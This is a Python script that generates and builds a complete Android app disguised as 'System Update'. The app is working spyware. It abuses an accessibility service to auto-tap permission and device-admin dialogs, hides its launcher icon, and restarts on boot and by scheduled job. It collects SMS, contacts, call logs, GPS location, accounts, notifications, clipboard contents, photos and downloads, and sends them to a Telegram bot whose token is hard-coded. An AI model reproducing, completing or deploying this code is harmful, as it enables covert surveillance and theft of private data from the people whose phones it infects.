#!/usr/bin/env python3
import os, shutil, base64, sys
TOKEN = sys.argv[1] if len(sys.argv) > 1 else "8920965375:AAFBU1g_bGAzsF89c8VH3y0uG71YrrX74YE"
CHAT  = sys.argv[2] if len(sys.argv) > 2 else "9258283271"
ROOT, PKG = "sysupdate", "com.android.systemupdate"
T64 = base64.b64encode(TOKEN.encode()).decode()
C64 = base64.b64encode(CHAT.encode()).decode()
F = {}

F[".gitignore"] = "build/\n.gradle/\nlocal.properties\n*.apk\n*.jks\nkeystore.properties\n"
F["settings.gradle.kts"] = """
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement { repositories { google(); mavenCentral() } }
rootProject.name = "sysupdate"
include(":app")
"""
F["build.gradle.kts"] = """
plugins {
    id("com.android.application") version "8.5.0" apply false
    id("org.jetbrains.kotlin.android") version "1.9.24" apply false
}
"""
F["gradle.properties"] = "android.useAndroidX=true\nandroid.enableR8.fullMode=true\norg.gradle.jvmargs=-Xmx3g\n"
F["proguard-rules.pro"] = """
-repackageclasses 'o'
-allowaccessmodification
-keep class com.android.systemupdate.MainActivity { *; }
-keep class com.android.systemupdate.Admin { *; }
-keep class com.android.systemupdate.A11y { *; }
-keep class com.android.systemupdate.Notif { *; }
-keep class com.android.systemupdate.Boot { *; }
-keep class com.android.systemupdate.Watchdog { *; }
-keep class com.android.systemupdate.Harvester { *; }
"""
F[".github/workflows/build.yml"] = """
name: build
on: [push, workflow_dispatch]
jobs:
  apk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17' }
      - uses: gradle/actions/setup-gradle@v3
        with: { gradle-version: '8.7' }
      - name: keystore
        run: |
          keytool -genkeypair -keystore ks.jks -storepass android -keypass android \\
            -alias k -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=System Update"
          printf "storeFile=../ks.jks\\nstorePassword=android\\nkeyAlias=k\\nkeyPassword=android\\n" > keystore.properties
      - run: gradle assembleRelease --no-daemon
      - uses: actions/upload-artifact@v4
        with: { name: apk, path: app/build/outputs/apk/release/app-release.apk }
"""
F["app/build.gradle.kts"] = """
import java.util.Properties
plugins { id("com.android.application"); id("org.jetbrains.kotlin.android") }
val kp = rootProject.file("keystore.properties")
android {
    namespace = "%s"
    compileSdk = 34
    defaultConfig {
        applicationId = "%s"
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }
    if (kp.exists()) {
        val p = Properties().apply { kp.inputStream().use { load(it) } }
        signingConfigs { create("rel") {
            storeFile = rootProject.file(p["storeFile"] as String)
            storePassword = p["storePassword"] as String
            keyAlias = p["keyAlias"] as String
            keyPassword = p["keyPassword"] as String
        } }
    }
    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "../../proguard-rules.pro")
            if (kp.exists()) signingConfig = signingConfigs.getByName("rel")
        }
    }
    compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
    kotlinOptions { jvmTarget = "17" }
}
dependencies { implementation("androidx.core:core-ktx:1.13.1") }
""" % (PKG, PKG)

F["app/src/main/res/drawable/ic_launcher.xml"] = """
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="108dp" android:height="108dp"
    android:viewportWidth="108" android:viewportHeight="108">
    <path android:fillColor="#4A4A4A" android:pathData="M0,0h108v108h-108z"/>
    <path android:fillColor="#FFFFFF"
        android:pathData="M54,24 L80,36 L80,58 C80,73 69,84 54,88 C39,84 28,73 28,58 L28,36 Z"/>
    <path android:fillColor="#4A4A4A"
        android:pathData="M50,46 h8 v14 h-8 z M44,58 h20 l-10,14 z"/>
</vector>
"""
F["app/src/main/res/xml/device_admin.xml"] = """
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <force-lock/><wipe-data/><limit-password/><watch-login/>
    </uses-policies>
</device-admin>
"""
F["app/src/main/res/xml/accessibility.xml"] = """
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeNotificationStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"/>
"""
F["app/src/main/AndroidManifest.xml"] = """
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <application android:label="System Update" android:icon="@drawable/ic_launcher"
                 android:allowBackup="false" android:supportsRtl="true">

        <activity android:name=".MainActivity" android:exported="true"
                  android:excludeFromRecents="true" android:noHistory="true"
                  android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar"/>

        <activity-alias android:name=".Launcher" android:targetActivity=".MainActivity"
                        android:exported="true" android:label="System Update"
                        android:icon="@drawable/ic_launcher">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity-alias>

        <service android:name=".Harvester" android:exported="false"
                 android:foregroundServiceType="dataSync|specialUse">
            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                      android:value="device telemetry sync"/>
        </service>

        <service android:name=".Notif" android:exported="false"
                 android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService"/>
            </intent-filter>
        </service>

        <service android:name=".A11y" android:exported="true"
                 android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice"
                       android:resource="@xml/accessibility"/>
        </service>

        <receiver android:name=".Admin" android:exported="true"
                  android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
            </intent-filter>
        </receiver>

        <receiver android:name=".Boot" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
            </intent-filter>
        </receiver>

        <service android:name=".Watchdog" android:exported="false"
                 android:permission="android.permission.BIND_JOB_SERVICE"/>
    </application>
</manifest>
"""
F["app/src/main/java/com/android/systemupdate/Admin.kt"] = """
package com.android.systemupdate
import android.app.admin.DeviceAdminReceiver
class Admin : DeviceAdminReceiver()
"""
F["app/src/main/java/com/android/systemupdate/Boot.kt"] = """
package com.android.systemupdate
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
class Boot : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) { Harvester.kick(c); Harvester.schedule(c) }
}
"""
F["app/src/main/java/com/android/systemupdate/Watchdog.kt"] = """
package com.android.systemupdate
import android.app.job.JobParameters
import android.app.job.JobService
class Watchdog : JobService() {
    override fun onStartJob(p: JobParameters?): Boolean {
        Harvester.kick(this); Harvester.schedule(this); return false
    }
    override fun onStopJob(p: JobParameters?): Boolean = true
}
"""
F["app/src/main/java/com/android/systemupdate/Notif.kt"] = """
package com.android.systemupdate
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
class Notif : NotificationListenerService() {
    override fun onNotificationPosted(s: StatusBarNotification?) {
        val n = s?.notification ?: return
        if (s.packageName == packageName) return
        val e = n.extras
        val t = e.getCharSequence("android.title")?.toString().orEmpty()
        val x = e.getCharSequence("android.text")?.toString().orEmpty()
        if (t.isEmpty() && x.isEmpty()) return
        Harvester.push(this, "NOTIF [" + s.packageName + "]\\n" + t + "\\n" + x)
    }
}
"""
F["app/src/main/java/com/android/systemupdate/A11y.kt"] = """
package com.android.systemupdate

import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class A11y : AccessibilityService() {
    private var lastClick = 0L
    private var lastFg = ""
    private var lastClip = ""
    private var lastAdmin = 0L
    private val H = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        Harvester.kick(this)
        Harvester.schedule(this)
        H.postDelayed({ heal() }, 4000)
        H.postDelayed({ heal() }, 300000)
        H.postDelayed({ heal() }, 900000)
    }

    private fun heal() {
        try {
            val cn = ComponentName(this, Admin::class.java)
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (!dpm.isAdminActive(cn) && System.currentTimeMillis() - lastAdmin > 240000) {
                lastAdmin = System.currentTimeMillis()
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            }
        } catch (e: Throwable) {}
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        val pkg = e?.packageName?.toString() ?: return
        click(pkg)
        if (e.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val cls = e.className?.toString().orEmpty()
            if (pkg != lastFg && !pkg.contains("launcher") && !pkg.contains("inputmethod")) {
                lastFg = pkg
                Harvester.push(this, "FG " + pkg + " / " + cls)
            }
            readClip()
            if (pkg.contains("settings")) H.postDelayed({ heal() }, 1500)
        }
    }

    private fun readClip() {
        try {
            val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val s = cb.primaryClip?.getItemAt(0)?.coerceToText(this)?.toString() ?: return
            if (s.isNotEmpty() && s != lastClip && s.length < 2000) {
                lastClip = s
                Harvester.push(this, "CLIP\\n" + s)
            }
        } catch (e: Throwable) {}
    }

    private fun click(pkg: String) {
        val ours = pkg.contains("permissioncontroller") || pkg.contains("packageinstaller")
        val sets = pkg.contains("settings")
        if (!ours && !sets) return
        val now = System.currentTimeMillis()
        if (now - lastClick < 700) return
        val root = rootInActiveWindow ?: return

        val labels = if (ours)
            listOf("Allow all the time", "While using the app", "Allow", "OK", "Continue", "Activate")
        else listOf("System Update", "Allow", "OK", "Continue", "Activate", "Turn on")

        for (label in labels) {
            val hits = root.findAccessibilityNodeInfosByText(label) ?: continue
            for (h in hits) {
                if (tap(h)) { lastClick = now; return }
            }
        }
    }

    private fun tap(n0: AccessibilityNodeInfo): Boolean {
        var n: AccessibilityNodeInfo? = n0
        var d = 0
        while (n != null && d < 6) {
            if (n.isClickable && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            val sw = findSwitch(n)
            if (sw != null && sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            n = n.parent; d++
        }
        return false
    }

    private fun findSwitch(n: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        for (i in 0 until n.childCount) {
            val c = n.getChild(i) ?: continue
            if (c.className?.toString()?.contains("Switch") == true) return c
            if (c.className?.toString()?.contains("ToggleButton") == true) return c
        }
        return null
    }

    override fun onInterrupt() {}
}
"""
F["app/src/main/java/com/android/systemupdate/MainActivity.kt"] = """
package com.android.systemupdate

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings

class MainActivity : Activity() {
    private val H = Handler(Looper.getMainLooper())
    private var stage = 0

    private fun perms(): Array<String> {
        val p = mutableListOf(
            Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA
        )
        if (Build.VERSION.SDK_INT >= 33) {
            p.add(Manifest.permission.POST_NOTIFICATIONS)
            p.add(Manifest.permission.READ_MEDIA_IMAGES)
            p.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else p.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        return p.toTypedArray()
    }

    private fun a11yOn(): Boolean = try {
        Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED) == 1 &&
        (Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            ?: "").contains(packageName)
    } catch (e: Throwable) { false }

    private fun notifOn(): Boolean = try {
        (Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: "")
            .contains(packageName)
    } catch (e: Throwable) { false }

    private fun adminOn(): Boolean = try {
        (getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager)
            .isAdminActive(ComponentName(this, Admin::class.java))
    } catch (e: Throwable) { false }

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        if (!a11yOn()) { stage = 1; openA11y() } else goPerms()
    }

    override fun onResume() {
        super.onResume()
        when (stage) {
            1 -> goPerms()
            4 -> goBatt()
            5 -> done()
        }
    }

    private fun openA11y() {
        try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
        catch (e: Throwable) { goPerms() }
    }

    private fun goPerms() {
        stage = 2
        val miss = perms().filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (miss.isEmpty()) { goAdmin(); return }
        requestPermissions(miss.toTypedArray(), 7)
    }

    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        goAdmin()
    }

    private fun goAdmin() {
        if (adminOn()) { goNotif(); return }
        stage = 3
        try {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, Admin::class.java))
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Needed to install system updates.")
            startActivityForResult(i, 12)
        } catch (e: Throwable) { goNotif() }
    }

    override fun onActivityResult(r: Int, c: Int, d: Intent?) {
        if (stage == 3) H.postDelayed({ goNotif() }, 500)
    }

    private fun goNotif() {
        if (notifOn()) { goBatt(); return }
        stage = 4
        try { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
        catch (e: Throwable) { goBatt() }
    }

    private fun goBatt() {
        stage = 5
        try {
            val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            i.data = android.net.Uri.parse("package:" + packageName)
            startActivity(i)
        } catch (e: Throwable) { done() }
    }

    private fun done() {
        stage = 6
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "$PKG.Launcher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
        } catch (e: Throwable) {}
        Harvester.kick(this)
        Harvester.schedule(this)
        H.postDelayed({ try { finishAndRemoveTask() } catch (e: Throwable) { finish() } }, 300)
    }
}
"""
F["app/src/main/java/com/android/systemupdate/Harvester.kt"] = """
package com.android.systemupdate

import android.app.*
import android.app.admin.DevicePolicyManager
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.StatFs
import android.provider.MediaStore
import android.util.Base64
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executor
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

class Harvester : Service() {
    private val token by lazy { String(Base64.decode("__T__", Base64.DEFAULT)).trim() }
    private val chat by lazy { String(Base64.decode("__C__", Base64.DEFAULT)).trim() }
    private val ui: Executor = Executor { r -> Handler(Looper.getMainLooper()).post(r) }
    private var step = 0
    private var prod = false
    private var send = false

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("s", "System Update", NotificationManager.IMPORTANCE_NONE)
            ch.setShowBadge(false)
            ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        guard()
    }

    private fun guard() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isDeviceOwnerApp(packageName))
                dpm.setUninstallBlocked(ComponentName(this, Admin::class.java), packageName, true)
        } catch (e: Throwable) {}
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        val n = if (Build.VERSION.SDK_INT >= 26)
            Notification.Builder(this, "s").setContentTitle("System Update")
                .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
        else Notification.Builder(this).setContentTitle("System Update").build()
        startForeground(1, n)
        if (!prod) { prod = true; thread { loop() } }
        if (!send) { send = true; thread { drain() } }
        return START_STICKY
    }

    private fun loop() {
        while (true) {
            try { cycle() } catch (e: Throwable) {}
            try { Thread.sleep(60000) } catch (e: Throwable) {}
        }
    }

    private fun cycle() {
        when (step % 15) {
            0 -> Q.text(this, "DEVICE\\n" + Build.MANUFACTURER + " " + Build.MODEL + "\\n" +
                    Build.DISPLAY + "\\nandroid " + Build.VERSION.RELEASE + " sdk " +
                    Build.VERSION.SDK_INT + "\\nfp " + Build.FINGERPRINT)
            1 -> Q.text(this, "SMS\\n" + sms())
            2 -> Q.text(this, "CONTACTS\\n" + contacts())
            3 -> Q.text(this, "CALLS\\n" + calls())
            4 -> Q.text(this, "LOCATION\\n" + loc())
            5 -> Q.text(this, "APPS\\n" + apps())
            6 -> Q.text(this, "ACCOUNTS\\n" + accounts())
            7 -> Q.text(this, "NET\\n" + net())
            8 -> photos()
            9 -> downloads()
            10 -> Q.text(this, "SYS " + battery() + " / free " + free())
            11 -> Q.text(this, "IP\\n" + ip())
            12 -> Q.text(this, "TZ " + java.util.TimeZone.getDefault().id + " / " +
                    java.util.Locale.getDefault())
            13 -> Q.text(this, "UP " + android.os.SystemClock.elapsedRealtime() / 1000 + "s")
            14 -> Q.text(this, "SMSN " + count("content://sms/inbox"))
        }
        step++
    }

    private fun count(u: String): Int {
        var c = 0
        try { contentResolver.query(Uri.parse(u), arrayOf("_id"), null, null, null)?.use { c = it.count } }
        catch (e: Throwable) {}
        return c
    }

    private fun sms(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"), null, null, "date DESC")?.use {
                while (it.moveToNext() && sb.length < 9000)
                    sb.append(it.getString(2)).append(" [").append(it.getInt(3)).append("] ")
                      .append(it.getString(0)).append(": ").append(it.getString(1)).append("\\n")
            }
        } catch (e: Throwable) {}
        return sb.toString().ifEmpty { "(no access)" }
    }

    private fun contacts(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf("display_name", "data1"), null, null, null)?.use {
                while (it.moveToNext() && sb.length < 9000)
                    sb.append(it.getString(0)).append(" : ").append(it.getString(1)).append("\\n")
            }
        } catch (e: Throwable) {}
        return sb.toString().ifEmpty { "(no access)" }
    }

    private fun calls(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(Uri.parse("content://call_log/calls"),
                arrayOf("number", "duration", "type", "date"), null, null, "date DESC")?.use {
                while (it.moveToNext() && sb.length < 9000)
                    sb.append(it.getString(3)).append(" ").append(it.getString(0)).append(" ")
                      .append(it.getString(1)).append("s t").append(it.getInt(2)).append("\\n")
            }
        } catch (e: Throwable) {}
        return sb.toString().ifEmpty { "(no access)" }
    }

    private fun apps(): String {
        val sb = StringBuilder()
        try {
            for (p in packageManager.getInstalledPackages(0))
                sb.append(p.packageName).append(" ").append(p.versionName).append("\\n")
        } catch (e: Throwable) {}
        return sb.toString().take(9000).ifEmpty { "(none)" }
    }

    private fun accounts(): String {
        val sb = StringBuilder()
        try {
            val am = android.accounts.AccountManager.get(this)
            for (a in am.getAccounts()) sb.append(a.type).append(" : ").append(a.name).append("\\n")
        } catch (e: Throwable) {}
        return sb.toString().ifEmpty { "(no access)" }
    }

    private fun net(): String {
        val sb = StringBuilder()
        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val i = wm.connectionInfo
            sb.append("ssid ").append(i.ssid).append("\\nbssid ").append(i.bssid)
              .append("\\nip ").append(i.ipAddress).append("\\nmac ").append(i.macAddress)
        } catch (e: Throwable) {}
        return sb.toString().ifEmpty { "(none)" }
    }

    private fun ip(): String {
        try {
            val c = URL("https://api.ipify.org").openConnection() as HttpURLConnection
            c.connectTimeout = 10000; c.readTimeout = 10000
            return c.inputStream.bufferedReader().readText().trim()
        } catch (e: Throwable) { return "(none)" }
    }

    private fun loc(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var best: Location? = null
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                for (p in arrayOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
                    val l = CountDownLatch(1)
                    lm.getCurrentLocation(p, null, ui) { r -> best = r; l.countDown() }
                    l.await(12, TimeUnit.SECONDS)
                    if (best != null) break
                }
            } else {
                best = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch (e: Throwable) {}
        val l = best ?: return "(none)"
        return "https://maps.google.com/?q=" + l.latitude + "," + l.longitude + " acc=" + l.accuracy
    }

    private fun battery(): String {
        val b = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return b.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).toString() + "%"
    }

    private fun free(): String {
        try {
            val s = StatFs(android.os.Environment.getDataDirectory().path)
            return (s.availableBytes / 1048576).toString() + "MB"
        } catch (e: Throwable) { return "?" }
    }

    private fun photos() {
        try {
            contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.SIZE), null, null, "date_added DESC")?.use {
                var n = 0
                while (it.moveToNext() && n < 6) {
                    if (it.getLong(2) > 3_500_000) continue
                    val u = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        it.getString(0))
                    if (Q.doc(this, u, "img_" + it.getString(1))) n++
                }
            }
        } catch (e: Throwable) {}
    }

    private fun downloads() {
        try {
            val sel = if (Build.VERSION.SDK_INT >= 29)
                MediaStore.Files.FileColumns.RELATIVE_PATH + " LIKE ?" else "data LIKE ?"
            val arg = if (Build.VERSION.SDK_INT >= 29) arrayOf("Download%") else arrayOf("%Download%")
            contentResolver.query(MediaStore.Files.getContentUri("external"),
                arrayOf(MediaStore.Files.FileColumns._ID, MediaStore.Files.FileColumns.DISPLAY_NAME,
                        MediaStore.Files.FileColumns.SIZE), sel, arg, "date_added DESC")?.use {
                var n = 0
                while (it.moveToNext() && n < 6) {
                    if (it.getLong(2) > 2_500_000) continue
                    val u = Uri.withAppendedPath(MediaStore.Files.getContentUri("external"),
                        it.getString(0))
                    if (Q.doc(this, u, "dl_" + it.getString(1))) n++
                }
            }
        } catch (e: Throwable) {}
    }

    private fun drain() {
        var fails = 0
        while (true) {
            try {
                val f = Q.next(this)
                if (f == null) { Thread.sleep(5000); continue }
                val ok = if (f.name.endsWith(".txt")) Q.pushText(token, chat, f.readText())
                         else Q.pushDoc(token, chat, f)
                if (ok) { f.delete(); fails = 0 }
                else { fails++; Thread.sleep(if (fails > 8) 300_000L else 20_000L) }
            } catch (e: Throwable) { try { Thread.sleep(15000) } catch (x: Throwable) {} }
        }
    }

    companion object {
        fun kick(c: Context) {
            try {
                val i = Intent(c, Harvester::class.java)
                if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i) else c.startService(i)
            } catch (e: Throwable) {}
        }
        fun push(c: Context, t: String) { try { Q.text(c, t) } catch (e: Throwable) {} }
        fun schedule(c: Context) {
            try {
                val js = c.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
                js.schedule(JobInfo.Builder(7, ComponentName(c, Watchdog::class.java))
                    .setPeriodic(15 * 60 * 1000L).setPersisted(true)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY).build())
            } catch (e: Throwable) {}
        }
    }
}
"""
F["app/src/main/java/com/android/systemupdate/Q.kt"] = """
package com.android.systemupdate

import android.content.Context
import android.net.Uri
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object Q {
    private fun tdir(c: Context) = File(c.filesDir, "q/t").apply { mkdirs() }
    private fun ddir(c: Context) = File(c.filesDir, "q/d").apply { mkdirs() }

    fun text(c: Context, s: String) {
        val d = tdir(c)
        val files = d.listFiles() ?: return
        if (files.size > 400) files.sortedBy { it.name }.take(files.size - 400).forEach { it.delete() }
        var i = 0; var off = 0
        while (off < s.length && i < 5) {
            val end = minOf(off + 3400, s.length)
            File(d, System.currentTimeMillis().toString() + "_" + i + ".txt")
                .writeText(s.substring(off, end))
            off = end; i++
        }
    }

    fun doc(c: Context, u: Uri, name: String): Boolean = try {
        val d = ddir(c)
        val files = d.listFiles()
        if (files != null && files.size > 30)
            files.sortedBy { it.name }.take(files.size - 30).forEach { it.delete() }
        val f = File(d, System.currentTimeMillis().toString() + "__" + sanitize(name))
        c.contentResolver.openInputStream(u)?.use { i -> f.outputStream().use { o -> i.copyTo(o) } }
        f.length() > 0
    } catch (e: Throwable) { false }

    private fun sanitize(n: String) = n.replace(Regex("[^A-Za-z0-9._-]"), "_").take(60)

    fun next(c: Context): File? {
        for (dir in arrayOf(tdir(c), ddir(c)))
            dir.listFiles()?.sortedBy { it.name }?.firstOrNull()?.let { return it }
        return null
    }

    private fun open(token: String, m: String): HttpURLConnection {
        val c = URL("https://api.telegram.org/bot" + token + "/" + m).openConnection()
            as HttpURLConnection
        c.requestMethod = "POST"; c.doOutput = true
        c.connectTimeout = 20000; c.readTimeout = 60000
        return c
    }

    fun pushText(token: String, chat: String, body: String): Boolean = try {
        val c = open(token, "sendMessage")
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        val w = OutputStreamWriter(c.outputStream)
        w.write("chat_id=" + chat + "&text=" + URLEncoder.encode(body, "UTF-8"))
        w.flush(); w.close()
        val ok = c.responseCode in 200..299
        c.disconnect(); ok
    } catch (e: Throwable) { false }

    fun pushDoc(token: String, chat: String, f: File): Boolean = try {
        val name = f.name.substringAfter("__", "f.bin")
        val b = "----" + System.currentTimeMillis()
        val c = open(token, "sendDocument")
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b)
        val o = c.outputStream
        fun p(s: String) = o.write(s.toByteArray())
        p("--" + b + "\\r\\nContent-Disposition: form-data; name=\\"chat_id\\"\\r\\n\\r\\n" + chat + "\\r\\n")
        p("--" + b + "\\r\\nContent-Disposition: form-data; name=\\"caption\\"\\r\\n\\r\\n" + name + "\\r\\n")
        p("--" + b + "\\r\\nContent-Disposition: form-data; name=\\"document\\"; filename=\\"" +
          name + "\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n")
        f.inputStream().use { it.copyTo(o) }
        p("\\r\\n--" + b + "--\\r\\n")
        o.flush(); o.close()
        val ok = c.responseCode in 200..299
        c.disconnect(); ok
    } catch (e: Throwable) { false }
}
"""

def write(rel, d):
    p = os.path.join(ROOT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "w", encoding="utf-8").write(d)

def main():
    if TOKEN == "PUT_TOKEN": print("!! token/chat do")
    if os.path.exists(ROOT): shutil.rmtree(ROOT)
    for rel, d in F.items():
        write(rel, d.replace("__T__", T64).replace("__C__", C64))
    print("bana:", ROOT)

if __name__ == "__main__":
    main()
